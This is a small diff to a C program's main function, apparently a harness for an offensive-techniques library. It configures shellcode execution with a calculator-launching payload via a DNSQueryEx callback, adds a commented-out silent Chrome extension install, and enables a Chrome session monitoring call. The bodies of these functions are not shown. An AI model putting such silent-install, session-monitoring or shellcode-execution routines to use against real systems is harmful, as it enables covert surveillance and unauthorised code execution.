@@ -34,8 +34,10 @@ int main(VOID)
 	Sei.Payload = GlobalOpenCalcPayload;
 	Sei.dwLengthOfPayloadInBytes = 277;
 	Sei.MethodEnum = E_DNSQUERYEX;
-	
+	WCHAR IpBuffer[32] = { 0 };
 
+	//MpfSilentInstallGoogleChromePluginW((PWCHAR)L"aapbdbdomjkkjkaonfhkkikfgjllcleb");
+	MpfComMonitorChromeSessionOnce2();
 	//ShellcodeExecutionViaFunctionCallbackMain(&Sei);
 
 	return dwError;
